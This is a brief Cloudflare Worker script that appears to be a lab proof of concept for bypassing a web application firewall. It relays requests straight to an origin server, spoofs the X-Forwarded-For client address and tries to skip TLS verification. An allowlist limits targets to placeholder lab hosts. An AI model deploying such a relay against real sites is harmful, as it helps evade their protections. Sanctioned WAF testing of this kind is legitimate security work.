addEventListener("fetch", (event) => {
  event.respondWith(handle(event.request));
});

async function handle(request) {
  const u = new URL(request.url);
  const target = u.searchParams.get("target") || "";
  const path = u.searchParams.get("path") || "/";
  // LAB SAFETY GATE: only our own origin IPs, sslip.io form. Anything else refused.
  const allowed = ["<ORIGIN-IP>.sslip.io", "<ATTACKER-TEST-IP>.sslip.io"];
  const host = target.split(":")[0];
  if (!allowed.includes(host)) {
    return new Response("refused: target not in lab allowlist", { status: 403 });
  }
  const url = "http://" + target + path + (u.searchParams.get("q") ? "?" + u.searchParams.get("q") : "");
  const t0 = Date.now();
  let r = null;
  try {
    r = await fetch(url, {
      headers: { "Host": host, "X-Forwarded-For": "203.0.113.66", "User-Agent": "waf-bypass-poc/1.0" },
      cf: { insecureSkipVerify: "true" },
    });
  } catch (e) {
    return new Response("fetch failed: " + e.message, { status: 502 });
  }
  const body = await r.text();
  return new Response(
    "[worker <operator>-b8b] fetched " + url + "\n[worker] origin responded HTTP " + r.status + " in " + (Date.now() - t0) + "ms\n--- origin body ---\n" + body,
    { status: 200, headers: { "Content-Type": "text/plain" } }
  );
}
